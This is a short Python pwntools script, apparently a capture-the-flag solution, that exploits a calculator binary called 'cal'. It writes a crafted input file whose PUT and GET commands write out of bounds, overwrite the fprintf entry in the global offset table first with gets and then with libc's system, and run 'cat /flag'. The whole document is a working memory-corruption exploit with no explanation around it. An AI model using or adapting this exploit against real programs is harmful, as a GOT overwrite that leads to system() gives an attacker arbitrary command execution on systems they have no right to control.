from pwn import *


elf = ELF('./cal')
libc = ELF('./libc.so.6')

result_buffer = elf.symbols['result_buffer']


def calc_offset(addr):
    return ((addr - result_buffer) // 4) & 0xFFFFFFFF


with open('test.cal', 'w') as f:
    content = ''
    content += '1+1\n'
    content += 'a\n'

    content += '''\
PUT {offset} ({target}-{original}+GET {offset})
'''.format(
        offset=calc_offset(elf.got['fprintf']),
        target=libc.symbols['gets'],
        original=libc.symbols['fprintf'],
    )

    content += '''\
GET 2048
'''

    content = content.ljust(8192, ' ')

    content += 'cat /flag\n'

    content += '''\
PUT {offset} ({target}-{original}+GET {offset})
GET 2048
'''.format(
        offset=calc_offset(elf.got['fprintf']),
        target=libc.symbols['system'],
        original=libc.symbols['gets'],
    )

    f.write(content)
